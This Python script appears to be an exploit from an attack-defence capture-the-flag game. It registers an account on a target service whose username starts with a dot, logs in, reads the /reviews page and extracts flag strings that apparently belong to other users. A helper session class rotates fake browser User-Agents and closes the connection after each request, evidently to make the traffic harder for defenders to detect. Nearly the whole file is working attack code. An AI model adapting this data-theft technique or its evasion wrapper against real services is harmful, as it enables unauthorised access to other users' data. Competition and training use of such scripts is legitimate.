#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import print_function

import re
import os
import random
import string
import requests
from sys import argv
from os import environ as env



env["TERM"] = "linux"
env["TERMINFO"] = "/etc/terminfo"
"""
    FakeSession reference:
        - `s = FakeSession(host, PORT)` -- creation
        - `s` mimics all standard request.Session API except of fe features:
            -- `url` can be started from "/path" and will be expanded to "http://{host}:{PORT}/path"
            -- for non-HTTP scheme use "http://{host}/path" template which will be expanded in the same manner
            -- `s` uses random browser-like User-Agents for every requests
            -- `s` closes connection after every request, so exploit get splitted among multiple TCP sessions
    Short requests reference:
        - `s.post(url, data={"arg": "value"})`          -- send request argument
        - `s.post(url, headers={"X-Boroda": "DA!"})`    -- send additional headers
        - `s.post(url, auth=(login, password)`          -- send basic http auth
        - `s.post(url, timeout=1.1)`                    -- send timeouted request
        - `s.request("CAT", url, data={"eat":"mice"})`  -- send custom-verb request
        (response data)
        - `r.text`/`r.json()`  -- text data // parsed json object
"""

""" <config> """
# SERVICE PORT
PORT = 9999
IP = argv[1]
DEBUG = os.getenv("DEBUG", True)


""" <body> """

def steal(host):
    s = FakeSession(host, PORT)

    username = '.' + rand_string(16)
    password = rand_string(16)

    resp = s.post("/signup",
                  data={
                      "username": username,
                      "address": username,
                      "ccn": username,
                      "review": "",
                      "password": password})
    log(resp.text)

    resp = s.post("/login",
                  data={
                      "username": username,
                      "password": password})
    log(resp.text)

    resp = s.get("/reviews")
    log(resp.text)

    flags = re.findall("[a-zA-Z0-9]{31}=", resp.text)
    log(flags)

    return flags

""" </body> """


def die(msg):
    print(msg)
    exit(1)


def log(obj):
    if DEBUG:
        print(obj)
    return obj


def fake_flag():
    return rand_string(N=31, alph=string.ascii_uppercase+string.digits) + "="


def rand_string(N=12, alph=string.ascii_letters + string.digits):
    return ''.join(random.choice(alph) for _ in range(N))


class FakeSession(requests.Session):
    USER_AGENTS = [
        """Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15""",
        """Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36""",
        """Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201""",
        """Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.13; ) Gecko/20101203""",
        """Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0"""
    ]

    def __init__(self, host, port):
        super(FakeSession, self).__init__()
        if port:
            self.hostport = "{}:{}".format(host, port)
        else:
            self.hostport = host

    def prepare_request(self, request):
        r = super(FakeSession, self).prepare_request(request)
        r.headers['User-Agent'] = random.choice(FakeSession.USER_AGENTS)
        r.headers['Connection'] = "close"
        return r

    def request(self, method, url,
                params=None, data=None, headers=None, cookies=None, files=None,
                auth=None, timeout=None, allow_redirects=True, proxies=None,
                hooks=None, stream=None, verify=None, cert=None, json=None):
        if url[0] == "/" and url[1] != "/":
            url = "http://" + self.hostport + url
        else:
            url = url.format(host=self.hostport)
        args = locals()
        args.pop("self")
        args.pop("__class__")
        r = super(FakeSession, self).request(**args)
        if DEBUG:
            print("[DEBUG] {method} {url} {r.status_code}".format(**locals()))
        return r


if __name__ == "__main__":
    print(steal(IP))
